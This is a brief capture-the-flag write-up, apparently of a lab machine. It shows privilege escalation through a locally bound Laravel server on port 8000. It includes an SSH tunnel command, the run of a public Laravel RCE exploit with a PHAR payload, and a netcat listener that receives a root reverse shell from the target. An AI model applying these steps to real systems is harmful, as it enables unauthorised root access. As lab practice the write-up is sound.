Looking at what ports are listening on the box shows an open port that wasn't seen before: 8000
- Curl the port to find that it's a web server running Laravel

Do some googling to find and RCE with laravel....only problem is that this web server can only be connected to locally
- Fortunately, the Strapi user is allowed a shell -> setup an SSH tunnel
```bash
ssh -L8000:127.0.0.1:8000 -i id_rsa strapi@10.10.11.105
```
- Then just run sript as if the web server was running locally on port 8000 to get a shell as root (no user privesc??)
```bash
-> % python3 exploit.py http://localhost:8000/ 1.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
```
On nc listener:
```bash
-> % nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.87] from (UNKNOWN) [10.10.11.105] 60946
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Note: I don't think I did this box the intended way. There was a user, "developer", that had a user.txt in their home directory. But I skipped this, I guess don't run your (relatively) easily exploitable web server as root?
